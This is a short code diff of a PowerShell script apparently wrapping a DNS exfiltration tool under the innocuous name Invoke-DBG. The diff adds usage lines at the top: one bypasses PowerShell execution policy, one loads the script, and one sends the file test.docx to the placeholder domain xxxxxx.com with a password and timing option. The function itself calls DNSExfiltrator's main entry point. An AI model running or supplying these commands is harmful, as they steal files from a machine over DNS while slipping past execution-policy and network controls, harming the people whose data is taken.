@@ -1,3 +1,8 @@
+powershell -ep bypass
+. .\dbg.ps1
+
+Invoke-DBG -i test.docx -d xxxxxx.com -p test123 -s xxxxxx -t 10
+------------
 function Invoke-DBG
 {
 	
@@ -79,4 +84,5 @@ function Invoke-DBG
 	
 	# Invoke the Main entry point
 	[DNSExfiltrator.DNSExfiltrator]::Main($Args)
+
 }
